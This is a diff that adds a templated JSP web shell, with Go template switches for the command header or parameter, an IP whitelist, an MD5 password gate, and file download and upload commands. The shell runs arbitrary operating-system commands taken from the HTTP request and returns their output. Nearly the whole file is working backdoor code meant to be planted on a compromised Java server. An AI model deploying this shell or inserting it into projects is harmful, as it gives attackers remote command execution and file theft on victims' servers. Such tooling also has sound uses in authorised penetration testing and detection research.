@@ -1,0 +1,132 @@
+<%@ page import="java.util.*,java.io.*" %>
+<%@ page language="java"%>
+{{ if ne .Password "" }}
+<%@ page import="java.security.*" %>
+{{ end }}
+{{ if .FileCapabilities }}
+{{/* <%@ page import="javax.servlet.http.*" %> */}}
+{{/* <%@ page import="org.apache.commons.fileupload.*" %> */}}
+{{/* <%@ page import="org.apache.commons.fileupload.disk.*" %> */}}
+{{/* <%@ page import="org.apache.commons.fileupload.servlet.*" %> */}}
+{{/* <%@ page import="org.apache.commons.codec.binary.*" %> */}}
+{{/* <%@ page import="org.apache.commons.io.output.*" %> */}}
+<%@ page import="java.nio.file.*" %>
+{{ end }}
+
+<%
+{{ if ne .CmdHeader "" -}}
+  String cmd = request.getHeader("{{ .CmdHeader }}");
+{{ else if ne .Method "" -}}
+  String cmd = request.getParameter("{{ .CmdParam }}");
+{{ end }}
+%>
+
+{{ if .Whitelist }}
+<%
+  String ip = request.getRemoteAddr();
+  String[] whitelist = { {{ range $ip := .WhitelistSlice }}"{{ $ip }}",{{ end }} };
+  if (!Arrays.asList(whitelist).contains(ip)) {
+    return;
+  }
+%>
+{{ end }}
+
+{{ if ne .Password "" }}
+<%
+  String hash = "{{ .PasswordHash }}";
+{{ if ne .PasswordHeader "" }}
+  String pass = request.getHeader("{{ .PasswordHeader }}");
+{{ else if ne .PasswordParam "" }}
+  String pass = request.getParameter("{{ .PasswordParam }}")
+{{ end }}
+
+  MessageDigest alg = MessageDigest.getInstance("MD5");
+  alg.reset();
+  alg.update(pass.getBytes());
+  byte[] digest = alg.digest();
+  StringBuffer md5 = new StringBuffer();
+
+  for (int i = 0; i < digest.length; i++) {
+    pass = Integer.toHexString(0xFF & digest[i]);
+    if (pass.length() < 2) {
+      pass = "0" + pass;
+    }
+    md5.append(pass);
+  }
+
+  if (!hash.equals(md5.toString())) {
+    return;
+  }
+%>
+{{ end }}
+
+{{ if .FileCapabilities }}
+<%
+  if (cmd.length() >= 4 && cmd.substring(0, 4).equals("get ")) {
+    String[] fileParams = cmd.split(" ");
+    if (fileParams.length >= 2) {
+      String filePath = fileParams[1];
+      File downloadFile = new File(filePath);
+      FileInputStream inStream = new FileInputStream(downloadFile);
+      
+      ServletContext context = getServletContext();
+      String mimeType = context.getMimeType(filePath);
+      if (mimeType == null) {
+          mimeType = "application/octet-stream";
+      }
+      response.setContentType(mimeType);
+      response.setContentLength((int) downloadFile.length());
+      response.setHeader("Content-Disposition", String.format("attachment; filename=\"%s\"", downloadFile.getName()));
+
+      OutputStream outStream = response.getOutputStream();
+      byte[] buffer = new byte[4096];
+      int bytesRead = -1;
+
+      while ((bytesRead = inStream.read(buffer)) != -1) {
+        outStream.write(buffer, 0, bytesRead);
+      }
+
+      inStream.close();
+      outStream.close();   
+
+      return;
+    } else {
+      out.println("No filename provided.");
+      return;
+    }
+  } else if (cmd.length() >= 4 && cmd.substring(0, 4).equals("put ")) {
+    String[] fileParams = cmd.split(" ");
+    String fileName = fileParams[1];
+    if (fileParams.length >= 3) {
+      fileName = fileParams[2];
+    } else {
+      File f = new File(fileName);
+      fileName = f.getName();
+    }
+
+    String fileContents = request.getParameter("f");
+    try {
+      byte[] fileContentsDecoded = Base64.getDecoder().decode(fileContents);
+
+      FileOutputStream fileOuputStream = new FileOutputStream(fileName);
+      fileOuputStream.write(fileContentsDecoded);
+    } catch (IllegalArgumentException e) {
+      out.println("Unable to decode base64.");
+    } catch (IOException e) {
+      out.println("Unable to write file");
+    }
+    return;
+  }
+%>
+{{ end }}
+
+<%
+Process p = Runtime.getRuntime().exec(cmd);
+InputStream in = p.getInputStream();
+DataInputStream ds = new DataInputStream(in);
+String o = ds.readLine();
+while ( o != null ) {
+  out.println(o); 
+  o = ds.readLine(); 
+}
+%>
